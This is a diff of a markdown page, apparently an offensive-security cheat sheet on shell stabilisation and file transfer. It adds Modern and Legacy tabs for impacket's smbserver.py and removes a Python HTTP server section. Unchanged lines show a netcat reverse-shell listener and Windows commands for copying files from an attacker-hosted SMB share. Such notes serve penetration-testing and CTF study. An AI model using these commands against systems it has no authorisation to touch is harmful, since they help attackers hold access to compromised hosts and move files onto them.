@@ -4,12 +4,9 @@ sidebar_position: 1
 
 # Stabilisation - Transfer
 
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
 
-:::caution This Section is a Work In Progress
-
-:::
-
-<br/>
 
 ## Stabilisation
 
@@ -37,15 +34,32 @@ rlwrap nc -nvlp 8888
 Set-WinUserLanguageList -LanguageList en-US -force
 ```
 
-<br/>
-
 ## SMBServer  
 
 - **Transfer Files to Windows with `SMBServer`** 
 
-```bash
-smbserver.py SHARE_NAME /DIRECTORY/HOSTING/FILES         # Use [.] to HOST in the Same Directory
+<Tabs>
+  <TabItem value="apple" label="Modern">
+    <div style={{color: 'red'}}>
+
+```log
+smbserver.py SHARE_NAME /DIRECTORY/HOSTING/FILES        
 ```
+
+</div>
+  </TabItem>
+  <TabItem value="orange" label="Legacy">
+    <div style={{color: 'red'}}>
+
+```log
+smbserver.py -smb2support -username USER_NAME -password PASSWORD public share
+```
+
+</div>
+  </TabItem>
+</Tabs>
+
+<br/>
 
 - **Remote Commands [From the Windows Machine]**
 
@@ -54,20 +68,6 @@ net view \\10.10.10.10                                   # View Share
 dir \\10.10.10.10\LINUXSHARE                             # List Share Contents
 copy \\10.10.10.10\LINUXSHARE\FILE_NAME.md FILE_NAME.md  # Copy Files
 ```
-
-## Python
-
-- **Start Simple `HTTP` Server**
-
-```bash
-# Python3
-python3 -m http.server 8888 
-
-# Python2
-python -m SimpleHTTPServer 8888  
-```
-
-<br/>
 
 ## PSH
 
